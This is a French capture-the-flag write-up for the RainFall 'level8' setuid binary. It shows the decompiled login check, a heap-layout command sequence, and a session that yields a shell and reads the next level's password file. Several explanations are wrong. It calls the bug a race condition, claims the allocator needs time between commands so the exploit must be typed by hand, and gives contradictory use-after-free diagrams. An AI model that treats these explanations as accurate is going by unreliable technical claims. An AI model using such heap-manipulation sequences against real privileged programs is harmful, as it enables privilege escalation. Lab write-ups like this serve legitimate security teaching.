# LEVEL 8

## 1. Introduction

Le binaire `level8` présente une vulnérabilité de **Use After Free** (UAF) combinée à une **condition de race** dans un programme de gestion d'authentification. Le programme utilise des pointeurs globaux `auth` et `service` qui peuvent être exploités pour contourner la vérification d'authentification.

## 2. Analyse

### 2.1 Droits du binaire
```bash
$ ls -la level8
-rwsr-s---+ 1 level9  level8  747441 Mar  6  2016 level8
```

### 2.2 Analyse des protections
```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
```

**Points clés :**
- **No RELRO** : Pas de protection contre l'écrasement de la GOT
- **No canary** : Pas de protection contre buffer overflow
- **NX disabled** : Exécution de code sur la pile possible
- **No PIE** : Adresses fixes (pas d'ASLR)

### 2.3 Analyse du code source

Le programme implémente un système d'authentification avec les commandes suivantes :

```c
// Variables globales
undefined4 *auth;    // Pointeur vers la structure d'authentification
char *service;       // Pointeur vers le service

// Commandes disponibles :
// 1. "auth " + <nom> : Alloue auth et copie le nom
// 2. "reset" : Libère auth avec free()
// 3. "service" + <nom> : Alloue service avec strdup()
// 4. "login" : Vérifie auth[8] == 0 pour donner le shell
```

### 2.4 Vulnérabilité identifiée

La vulnérabilité principale se trouve dans la commande `login` :

```c
if ((!(bool)uVar11 && !(bool)uVar8) == (bool)uVar11) {
    if (auth[8] == 0) {           // ← Vérification vulnérable !
        fwrite("Password:\n",1,10,stdout);
    }
    else {
        system("/bin/sh");         // ← Notre cible !
    }
}
```

**Problème :** Le programme vérifie `auth[8] == 0` mais :
1. `auth` est un pointeur vers 4 octets (`malloc(4)`)
2. `auth[8]` accède à l'index 8 (32 octets plus loin)
3. Si `service` est alloué après `auth`, il peut écraser cette zone

## 3. Exploitation

### 3.1 Étape 1 : Analyse précise de la vulnérabilité

En analysant le code plus attentivement :

1. **Commande `auth`** : 
   - Alloue `auth` avec `malloc(4)`
   - Copie le contenu après "auth " dans `local_8b` puis dans `auth`
   - `local_8b` est à l'offset `-2` de `acStack_89`

2. **Commande `service`** :
   - Utilise `strdup(acStack_89)` (offset +7 après "service")
   - `acStack_89` commence 7 caractères après le début de l'entrée

3. **Commande `login`** :
   - Vérifie `auth[8] == 0`
   - `auth[8]` = `auth + 32 bytes` (8 * 4 = 32)

### 3.2 Étape 2 : Stratégie d'exploitation

Le problème est que `auth` n'est alloué qu'avec 4 bytes, mais on vérifie `auth[8]` qui est 32 bytes plus loin. Il faut donc :

1. **Contrôler la disposition mémoire** pour que `auth[8]` pointe vers une zone contrôlée
2. **Utiliser le fait que `reset` ne met pas `auth` à NULL**
3. **Exploiter la réutilisation de mémoire par l'allocateur**

### 3.3 Étape 3 : Exploitation alternative (plus fiable)

Une approche plus fiable consiste à utiliser la proximité des allocations :

```bash
# 1. Allouer auth plusieurs fois pour fragmenter la heap
auth AAAA
reset
auth BBBB
reset
auth CCCC
reset

# 2. Allouer service avec beaucoup de données
serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# 3. Réallouer auth
auth DDDD

# 4. Tenter login
login
```

## 4. Structure du Payload

### 4.1 Ce qui se passe concrètement

```
┌─────────────────────────────────────────────────────────┐
│              USE AFTER FREE EXPLOITATION               │
├─────────────────────────────────────────────────────────┤
│  1. auth AAAA         │ ← Alloue auth[4]              │
│  2. serviceBBBB...    │ ← Alloue service (strdup)     │
│  3. reset             │ ← Libère auth avec free()     │
│  4. serviceCCCC...    │ ← Nouveau service (réutilise) │
│  5. login             │ ← Vérifie auth[8] (32 bytes)  │
└─────────────────────────────────────────────────────────┘
```

### 4.2 Structure de la mémoire

```
┌─────────────────┐
│   auth[0-3]     │ ← 4 octets alloués (malloc(4))
├─────────────────┤
│   ... heap ...  │ ← Autres allocations (service)
├─────────────────┤
│   auth[8]       │ ← 32 bytes plus loin (8*4=32)
├─────────────────┤
│   Contrôlable   │ ← Via service ou fragmentation
└─────────────────┘
```

### 4.3 Stratégie de fragmentation heap

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Allocation    │    │   Libération    │    │   Réutilisation │
│   auth multiple │───▶│   reset         │───▶│   service long  │
│   Fragmentation │    │   free(auth)    │    │   strdup()      │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

### 4.4 Flux d'exécution corrigé

```
1. "auth AAAA" : malloc(4) à l'adresse X
2. "serviceBBBB..." : strdup() peut allouer à X+32 ou plus loin
3. "reset" : free(auth), mais pointeur auth reste à X
4. "serviceCCCC..." : strdup() peut réutiliser l'espace près de X
5. "login" : Vérifie auth[8] = *(X + 32)
   - Si service a été alloué près de X+32 → auth[8] != 0 → shell
   - Sinon → "Password:"
```

### 4.5 Visualisation de l'exploitation corrigée

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Fragmentation │    │   Service       │    │   Auth[8]       │
│   Heap          │───▶│   Allocation    │───▶│   Control       │
│   Multiple auth │    │   Near auth[8]  │    │   != 0          │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

### 4.6 Mécanisme de UAF

```
┌─────────────────┐
│ auth[0-3]       │ ← Zone allouée (4 bytes)
├─────────────────┤
│ auth[4-7]       │ ← Zone non allouée
├─────────────────┤
│ auth[8]         │ ← Cible de vérification
└─────────────────┘
```

### 4.7 Commandes complètes

**Important :** Cette exploitation doit être faite **manuellement** et non avec un script. Les raisons sont :

1. **Timing critique** : Le programme traite les commandes une par une avec des délais
2. **Allocation séquentielle** : L'allocateur de mémoire a besoin de temps entre les opérations
3. **Session interactive** : Le programme maintient l'état entre les commandes dans la même session

### 4.8 Exploitation manuelle

```bash
# Se connecter au niveau
ssh level8@<IP> -p 4242

# Lancer le programme
./level8

# Tapez les commandes une par une (attendez l'affichage des pointeurs entre chaque) :
auth AAAA
reset
auth BBBB
reset  
auth CCCC
reset
serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
auth DDDD
login
```

### 4.9 Exemple de session manuelle

```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
auth AAAA
0x804a008, (nil) 
reset
0x804a008, (nil) 
auth BBBB
0x804a008, (nil) 
reset
0x804a008, (nil) 
auth CCCC
0x804a008, (nil) 
reset
0x804a008, (nil) 
serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018 
auth DDDD
0x804a008, 0x804a018 
login
$ cat /home/user/level9/.pass
```

La version manuelle garantit le bon timing et la bonne séquence d'allocations mémoire nécessaire à l'exploitation.

## 5. Conclusion

Cette exploitation démontre l'importance de la gestion correcte de la mémoire et les dangers des Use After Free dans les applications critiques. 